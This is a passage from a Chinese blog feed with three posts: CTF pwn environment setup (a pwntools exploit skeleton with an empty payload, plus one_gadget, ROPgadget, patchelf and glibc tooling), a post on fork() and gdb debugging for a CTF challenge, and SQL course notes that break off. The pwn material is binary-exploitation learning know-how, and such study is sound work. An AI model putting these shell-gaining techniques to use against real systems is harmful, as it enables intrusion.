class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"./easy_stack"</span>)</span><br><span class="line"><span class="comment">#p = remote('', '')</span></span><br><span class="line">p = process(<span class="string">"./easy_stack"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_start_main_offset=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">payload = </span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>一个用于在libc中寻找直接get shell地址的工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install ruby</span><br><span class="line">$ sudo apt-get install gem</span><br><span class="line">$ sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h3 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h3><p>one_gadget libc-2.23.so</p><p>-l可以指定搜索等级</p><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>用于构造ROP链的工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">$ cd ROPgadget</span><br><span class="line">$ sudo python setup.py install</span><br></pre></td></tr></table></figure><h3 id="常用操作-1"><a href="#常用操作-1" class="headerlink" title="常用操作"></a>常用操作</h3><p>ROPgadget –binary morton.dms –only ‘pop|ret’ | grep rdi</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>相当于linux下的虚拟机，有助于一劳永逸的解决各种环境问题</p><p>参照这个：<a href="https://blog.csdn.net/jinking01/article/details/82490688" target="_blank" rel="noopener">https://blog.csdn.net/jinking01/article/details/82490688</a></p><h3 id="使用操作-3"><a href="#使用操作-3" class="headerlink" title="使用操作"></a>使用操作</h3><p><a href="https://www.runoob.com/docker/docker-hello-world.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-hello-world.html</a></p><h4 id="pwndocker"><a href="#pwndocker" class="headerlink" title="pwndocker"></a>pwndocker</h4><p><a href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-正确使用姿势" target="_blank" rel="noopener">https://nocbtm.github.io/2020/02/24/skysider-pwndocker-正确使用姿势</a></p><p>运行：sudo docker exec -it d094 bash</p><h2 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h2><p>一个二进制分析框架，学符号执行时使用的</p><p>其实很简单的问题，只需要将python3.5换成python3.7就行，但是整了很久</p><p>主要是开始python3玩崩了打算去用docker，结果那个镜像好像有点问题…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</span><br><span class="line">$ export WORKON_HOME=$HOME/Python-workhome</span><br><span class="line">$ source /usr/share/virtualenvwrapper/virtualenvwrapper.sh</span><br><span class="line">$ mkvirtualenv angr</span><br><span class="line">$ sudo pip3 install angr</span><br></pre></td></tr></table></figure><p>其中virtualenvwrapper是一个Python虚拟环境，使用虚拟环境的主要原因是angr会修改libz3和libVEX</p><p>创建虚拟环境之后每次使用<code>workon</code>和<code>deactivate</code>即可在真实与虚拟环境切换</p><h2 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h2><p><a href="https://github.com/matrix1001/glibc-all-in-one" target="_blank" rel="noopener">https://github.com/matrix1001/glibc-all-in-one</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;matrix1001&#x2F;glibc-all-in-one.git</span><br><span class="line">$ cd glibc-all-in-one&#x2F;</span><br><span class="line">$ chmod a+x build download extract</span><br><span class="line">$ .&#x2F;update_list</span><br></pre></td></tr></table></figure><h3 id="查看list文件"><a href="#查看list文件" class="headerlink" title="查看list文件"></a>查看list文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat list</span><br><span class="line">$ cat old_list</span><br></pre></td></tr></table></figure><h3 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h3><p>例如需要下载2.29-0ubuntu2_amd64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;download_old 2.29-0ubuntu2_amd64</span><br><span class="line">Getting 2.29-0ubuntu2_amd64</span><br><span class="line">  -&gt; Location: http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6_2.29-0ubuntu2_amd64.deb</span><br><span class="line">  -&gt; Downloading libc binary package</span><br><span class="line">  -&gt; Extracting libc binary package</span><br><span class="line">  -&gt; Package saved to libs&#x2F;2.29-0ubuntu2_amd64</span><br><span class="line">  -&gt; Location: http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">  -&gt; Downloading libc debug package</span><br><span class="line">  -&gt; Extracting libc debug package</span><br><span class="line">  -&gt; Package saved to libs&#x2F;2.29-0ubuntu2_amd64&#x2F;.debug</span><br><span class="line">$ ls libs&#x2F;2.29-0ubuntu2_amd64&#x2F;</span><br><span class="line">ld-2.29.so ... libc-2.29.so</span><br></pre></td></tr></table></figure><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install patchelf</span><br></pre></td></tr></table></figure><p>例如我们需要让 re-alloc 程序指向glibc-all-in-one中下载的libc-2.29</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ldd re-alloc </span><br><span class="line">linux-vdso.so.1 &#x3D;&gt;  (0x00007ffd3e7c7000)</span><br><span class="line">libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f48a66cb000)</span><br><span class="line">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f48a6a95000)</span><br><span class="line">$ patchelf  --set-rpath ~&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.29-0ubuntu2_amd64&#x2F; re-alloc</span><br><span class="line">$ patchelf --set-interpreter ~&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.29-0ubuntu2_amd64&#x2F;ld-2.29.so re-alloc</span><br><span class="line">$ ldd re-alloc </span><br><span class="line">linux-vdso.so.1 &#x3D;&gt;  (0x00007ffdaff7e000)</span><br><span class="line">libc.so.6 &#x3D;&gt; &#x2F;home&#x2F;ctfer&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.29-0ubuntu2_amd64&#x2F;libc.so.6 (0x00007f2d342fd000)</span><br><span class="line">&#x2F;home&#x2F;ctfer&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.29-0ubuntu2_amd64&#x2F;ld-2.29.so &#x3D;&gt; &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f2d342c4000)</span><br></pre></td></tr></table></figure><h1 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h1><h2 id="sudo-apt-get-install"><a href="#sudo-apt-get-install" class="headerlink" title="sudo  apt-get install"></a>sudo  apt-get install</h2><p>报错信息一般是这玩意</p><p>E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)<br>E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?</p><p>解决方案：<a href="https://blog.csdn.net/jiangjiang_jian/article/details/80695548" target="_blank" rel="noopener">https://blog.csdn.net/jiangjiang_jian/article/details/80695548</a></p><h2 id="那些直接百度或者google最后一行报错信息就能解决的问题就不贴了"><a href="#那些直接百度或者google最后一行报错信息就能解决的问题就不贴了" class="headerlink" title="那些直接百度或者google最后一行报错信息就能解决的问题就不贴了"></a>那些直接百度或者google最后一行报错信息就能解决的问题就不贴了</h2>]]></content>
      
      
      <categories>
          
          <category> ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GUESS-fork相关</title>
      <link href="2020/04/18/GUESS-fork%E7%9B%B8%E5%85%B3/"/>
      <url>2020/04/18/GUESS-fork%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="fork相关"><a href="#fork相关" class="headerlink" title="fork相关"></a>fork相关</h1><p><a href="http://0bs3rver.space/2020/04/13/网鼎杯2018-pwn-GUESS-StackSmash/" target="_blank" rel="noopener">GUESS-WP</a></p><p>​    写GUESS这题的时候完全没有注意到调用了fork，因为最开始自己运行的时候让我猜了三次，于是就扔进ida直接看到gets()就开始准备利用漏洞了，学长提醒我我才注意到那题并不是那么单纯。</p><h2 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h2><p>​    fork函数这个函数很有意思，它是在程序调用它之后，由系统给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，进程的运行也是从父进程调用fork函数的地方开始，两个进程的区别是fork返回的值不同。</p><p>​    <strong>fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：</strong><br>  1）在父进程中，fork返回新创建子进程的进程ID；<br>  2）在子进程中，fork返回0；<br>  3）如果出现错误，fork返回一个负值。</p><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>​    例如GUESS那题中，程序就是利用返回值来实现与用户的交互</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master/blogimg/fork-1.png"  alt=""></p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master/blogimg/fork-2.png"  alt=""></p><p>​    这里实质上是父进程循环了三次后return，而每次fork出的子进程由于返回值是零，通过if函数后执行break跳出循环，给予用户输入的机会，然后子进程就结束了。</p><p>​    所以一共会fork出三个子进程，这也就是我执行程序时，拥有三次输入机会的由来。</p><h1 id="父子进程的调试"><a href="#父子进程的调试" class="headerlink" title="父子进程的调试"></a>父子进程的调试</h1><p>​    在gdb中可以通过设置达到多进程调试的效果。</p><p>​    我这次是分开进行调试的，一起调试的方法等遇到了再写。</p><h2 id="1、-follow-fork-mode"><a href="#1、-follow-fork-mode" class="headerlink" title="1、 follow-fork-mode"></a>1、 follow-fork-mode</h2><p>​    用法：set follow-fork-mode [parent|child] </p><p>​    进入gdb后，直接设置，默认是child</p><p>​    用处是当fork出子进程后，确定当前调试的进程，parent为父进程，child为子进程</p><p>​    可用使用show follow-fork-mode 来查询当前fork模式</p><h2 id="2、detach-on-fork-mode"><a href="#2、detach-on-fork-mode" class="headerlink" title="2、detach-on-fork mode"></a>2、detach-on-fork mode</h2><p>​    用法：set detach-on-fork [on|off]</p><p>​    on: 只调试父进程或子进程的其中一个(根据follow-fork-mode来决定)，这是默认的模式，另一个进程会继续执行。</p><p>​    off: 父子进程都在gdb的控制之下，其中一个进程正常调试(根据follow-fork-mode来决定),另一个进程会被设置为暂停状态。</p><p>​    也可以通过show detach-on-fork mode 来查询当前模式</p><p>​    eg：如果设置了set detach-on-fork off且follow-fork-mode为parent，fork后子进程并不运行，而是处于暂停状态。</p><h2 id="3、进程的切换"><a href="#3、进程的切换" class="headerlink" title="3、进程的切换"></a>3、进程的切换</h2><p>​    在gdb中使用info inferiors来查看进程信息，得到的信息可以看到最前面有一个进程编号，使用 inferior [num] 来进行进程切换。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/fork-3.png"  alt=""></p><p>​    ps：我在进行调试的时候，发现fork出一个新的子进程后，父进程的pid会出现变化，在终端对pid进行查询和分析后，认为是gdb调试的并不是程序的主进程，理由是虽然子进程1的父进程变成了2033进程，但是gdb调试的编号1的父进程，虽然pid有变化，但是父进程并没有变。</p><p>​    由于本人学识尚浅，只能作出推测，如果师傅发现我这里有错误或是能为我解惑，还请与我联系交流。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> fork </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql语句整理</title>
      <link href="2020/04/17/sql%E8%AF%AD%E5%8F%A5%E6%95%B4%E7%90%86/"/>
      <url>2020/04/17/sql%E8%AF%AD%E5%8F%A5%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL语句整理"><a href="#SQL语句整理" class="headerlink" title="SQL语句整理"></a>SQL语句整理</h1><p>最近在上数据库的课，于是整理一下常用的sql语句，便于自己查看</p><p>本机为Mac osx 10.15，使用的是mysql，使用navicat作为可视化操作环境</p><h2 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h2><h3 id="创建sc模式"><a href="#创建sc模式" class="headerlink" title="创建sc模式"></a>创建sc模式</h3><p>CREATE SCHEMA sc;</p><h3 id="创建学生表Student"><a href="#创建学生表Student" class="headerlink" title="创建学生表Student"></a>创建学生表Student</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Student</span><br><span class="line"></span><br><span class="line">(Sno <span class="built_in">char</span>(<span class="number">9</span>) primary <span class="keyword">key</span>, </span><br><span class="line"></span><br><span class="line">Sname <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">unique</span>,</span><br><span class="line"></span><br><span class="line">Ssex <span class="built_in">char</span>(<span class="number">3</span>), </span><br><span class="line"></span><br><span class="line">Sage <span class="built_in">smallint</span>,</span><br><span class="line"></span><br><span class="line">Sdept <span class="built_in">char</span>(<span class="number">3</span>) );</span><br></pre></td></tr></table></figure><p>学号，姓名，性别，年龄，专业，其中学号为主码，姓名唯一</p><h4 id="添加四位学生"><a href="#添加四位学生" class="headerlink" title="添加四位学生"></a>添加四位学生</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student(sno,sname,ssex,sage,sdept) <span class="keyword">values</span>(<span class="string">'201215121'</span>,<span class="string">'李勇'</span>,<span class="string">'男'</span>,<span class="number">20</span>,<span class="string">'CS'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student(sno,sname,ssex,sage,sdept) <span class="keyword">values</span>(<span class="string">'201215122'</span>,<span class="string">'刘晨'</span>,<span class="string">'女'</span>,<span class="number">19</span>,<span class="string">'CS'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student(sno,sname,ssex,sage,sdept) <span class="keyword">values</span>(<span class="string">'201215123'</span>,<span class="string">'王敏'</span>,<span class="string">'女'</span>,<span class="number">18</span>,<span class="string">'MA'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student(sno,sname,ssex,sage,sdept) <span class="keyword">values</span>(<span class="string">'201215125'</span>,<span class="string">'张立'</span>,<span class="string">'男'</span>,<span class="number">19</span>,<span class="string">'IS'</span>);</span><br></pre></td></tr></table></figure><h3 id="创建课程表Course"><a href="#创建课程表Course" class="headerlink" title="创建课程表Course"></a>创建课程表Course</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Course</span><br><span class="line">(Cno <span class="built_in">char</span>(<span class="number">4</span>) primary <span class="keyword">key</span>, </span><br><span class="line">Cname <span class="built_in">char</span>(<span class="number">12</span>),</span><br><span class="line">Cpno <span class="built_in">char</span>(<span class="number">4</span>) ,</span><br><span class="line">Ccredit <span class="built_in">smallint</span>,</span><br><span class="line"><span class="keyword">Foreign</span> <span class="keyword">key</span>(Cpno) <span class="keyword">references</span> Course (Cno) );</span><br></pre></td></tr></table></figure><p>课程号，课程名，先行课，学分，其中课程号为主码，cpno为外码，参照表是Course，参照列是cno</p><h4 id="添加七个课程"><a href="#添加七个课程" class="headerlink" title="添加七个课程"></a>添加七个课程</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course(cno,cname,cpno,ccredit) <span class="keyword">values</span>(<span class="string">'2'</span>,<span class="string">'数学'</span>,<span class="literal">NULL</span>,<span class="number">2</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course(cno,cname,cpno,ccredit) <span class="keyword">values</span>(<span class="string">'6'</span>,<span class="string">'数据处理'</span>,<span class="literal">NULL</span>,<span class="number">2</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course(cno,cname,cpno,ccredit) <span class="keyword">values</span>(<span class="string">'4'</span>,<span class="string">'操作系统'</span>,<span class="number">6</span>,<span class="number">3</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course(cno,cname,cpno,ccredit) <span class="keyword">values</span>(<span class="string">'7'</span>,<span class="string">'PASCAL'</span>,<span class="number">6</span>,<span class="number">4</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course(cno,cname,cpno,ccredit) <span class="keyword">values</span>(<span class="string">'5'</span>,<span class="string">'数据结构'</span>,<span class="number">7</span>,<span class="number">4</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course(cno,cname,cpno,ccredit) <span class="keyword">values</span>(<span class="string">'1'</span>,<span class="string">'数据库'</span>,<span class="number">5</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course(cno,cname,cpno,ccredit) <span class="keyword">values</span>(<span class="string">'3'</span>,<span class="string">'信息系统'</span>,<span class="number">1</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><h3 id="创建学生选课表sc"><a href="#创建学生选课表sc" class="headerlink" title="创建学生选课表sc"></a>创建学生选课表sc</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> SC</span><br><span class="line">(Sno <span class="built_in">char</span>(<span class="number">9</span>),</span><br><span class="line">Cno <span class="built_in">char</span>(<span class="number">4</span>),</span><br><span class="line">Grade <span class="built_in">smallint</span>,</span><br><span class="line">primary <span class="keyword">key</span> (Sno,Cno),</span><br><span class="line"><span class="keyword">foreign</span> <span class="keyword">key</span> (Sno) <span class="keyword">references</span> Student(Sno), </span><br><span class="line"><span class="keyword">foreign</span> <span class="keyword">key</span> (Cno) <span class="keyword">references</span> Course(Cno));</span><br></pre></td></tr></table></figure><h4 id="添加5个选课关系"><a href="#添加5个选课关系" class="headerlink" title="添加5个选课关系"></a>添加5个选课关系</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sc (sno,cno, grade) <span class="keyword">values</span>(<span class="string">'201215121'</span>,<span class="number">1</span>,<span class="number">92</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sc (sno,cno, grade) <span class="keyword">values</span>(<span class="string">'201215121'</span>,<span class="number">2</span>,<span class="number">85</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sc (sno,cno, grade) <span class="keyword">values</span>(<span class="string">'201215121'</span>,<span class="number">3</span>,<span class="number">88</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sc (sno,cno, grade) <span class="keyword">values</span>(<span class="string">'201215122'</span>,<span class="number">2</span>,<span class="number">90</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sc (sno,cno, grade) <span class="keyword">values</span>(<span class="string">'201215122'</span>,<span class="number">3</span>,<span class="number">80</span>);</span><br></pre></td></tr></table></figure><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><h3 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h3><h4 id="选择表中的若干列"><a href="#选择表中的若干列" class="headerlink" title="选择表中的若干列"></a>选择表中的若干列</h4><p>eg：需要查学生表上的全部信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Ssex,Sage,Sdept <span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure><p>而查询全部信息时也可以用 * 代替</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure><h5 id="选择经过计算的值"><a href="#选择经过计算的值" class="headerlink" title="选择经过计算的值"></a>选择经过计算的值</h5><p>eg：查全体学生的姓名及其出生年份</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="number">2020</span>-Sage</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure><p>而此时计算结果的列名会显示为 ‘2020-Sage’</p><p>eg：查询全体学生的姓名、出生年份和所在的院系，要求用 小写字母表示系名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname <span class="keyword">NAME</span>, <span class="string">'Year of Birth:'</span> BIRTH, <span class="number">2020</span>-Sage BIRTHYEAR,</span><br><span class="line"><span class="keyword">LOWER</span>(Sdept) DEPARTMENT</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure><p>可以使用列别名来改变查询结果的列标题，且构造出来一个内容全为 ‘Year of Birth:’ 的BIRTH列，并为其他列都改变了标题</p><h4 id="选择表中的若干元组"><a href="#选择表中的若干元组" class="headerlink" title="选择表中的若干元组"></a>选择表中的若干元组</h4><p>eg：查询选修了课程的学生学号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno <span class="keyword">FROM</span> SC;</span><br></pre></td></tr></table></figure><p>DISTINCT关键字用于去除表中重复的行</p><h5 id="常用的查询条件"><a href="#常用的查询条件" class="headerlink" title="常用的查询条件"></a>常用的查询条件</h5><table><thead><tr><th align="center">查询条件</th><th align="center">谓词</th></tr></thead><tbody><tr><td align="center">比较</td><td align="center"><strong>=,&gt;,&lt;,&gt;=,&lt;=,!=,&lt;&gt;,!&gt;,!&lt;;NOT+</strong>上述比较运算符</td></tr><tr><td align="center">确定范围</td><td align="center"><strong>BETWEEN AND, NOT BETWEEN AND</strong></td></tr><tr><td align="center">确定集合</td><td align="center">IN,NOT IN</td></tr><tr><td align="center">字符匹配</td><td align="center">LIKE,NOT LIKE</td></tr><tr><td align="center">空值</td><td align="center">IS NULL,IS NOT NULL</td></tr><tr><td align="center">多重条件（逻辑运算）</td><td align="center">AND,OR,NOT</td></tr></tbody></table><h5 id="比较大小"><a href="#比较大小" class="headerlink" title="比较大小"></a>比较大小</h5><p>eg：查询计算机科学系全体学生的名单</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname <span class="keyword">from</span> student <span class="keyword">where</span> sdept=<span class="string">'CS'</span></span><br></pre></td></tr></table></figure><p>π sname(σ sdept=’CS’(Student))</p><h5 id="确定范围"><a href="#确定范围" class="headerlink" title="确定范围"></a>确定范围</h5><p>eg：查询年龄在<strong>20~23</strong>岁(包括<strong>20</strong>岁和<strong>23</strong>岁)之间的学生 的姓名、系别和年龄</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname,sdept,sage <span class="keyword">from</span> student <span class="keyword">where</span> sage <span class="keyword">between</span> <span class="number">20</span> <span class="keyword">and</span> <span class="number">23</span></span><br></pre></td></tr></table></figure><h5 id="确定集合"><a href="#确定集合" class="headerlink" title="确定集合"></a>确定集合</h5><p>eg：查询<strong>CS</strong>系和<strong>IS</strong>系学生的姓名和性别</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname,ssex <span class="keyword">from</span> student <span class="keyword">where</span> sdept <span class="keyword">in</span> (<span class="string">'CS'</span>,<span class="string">'IS'</span>)</span><br></pre></td></tr></table></figure><h5 id="字符匹配"><a href="#字符匹配" class="headerlink" title="字符匹配"></a>字符匹配</h5><p>谓词:<strong>[NOT]LIKE ‘&lt;</strong>匹配串<strong>&gt;’ [ESCAPE‘&lt;</strong>换码字符<strong>&gt;’]</strong></p><p><strong>&lt;</strong>匹配串<strong>&gt;</strong>可以是一个完整的字符串，也可以含有通配符<strong>%</strong>和 _</p><p><strong>%</strong> (百分号) 代表任意长度(长度可以为<strong>0</strong>)的字符串，例如<strong>a%b</strong>表示以<strong>a</strong>开头，以<strong>b</strong>结尾的任意长度的字符串</p><p><strong>_</strong> (下横线) 代表任意单个字符，例如<strong>a_b</strong>表示以<strong>a</strong>开头，以<strong>b</strong>结尾的长度为<strong>3</strong>的任意字符串</p><p>eg：查询学号为<strong>201215121</strong>的学生的详细情况</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">LIKE</span> <span class="string">'201215121'</span>;</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno = <span class="string">'201215121'</span>;</span><br></pre></td></tr></table></figure><p>eg：查询所有姓刘学生的姓名、学号和性别</p><figure 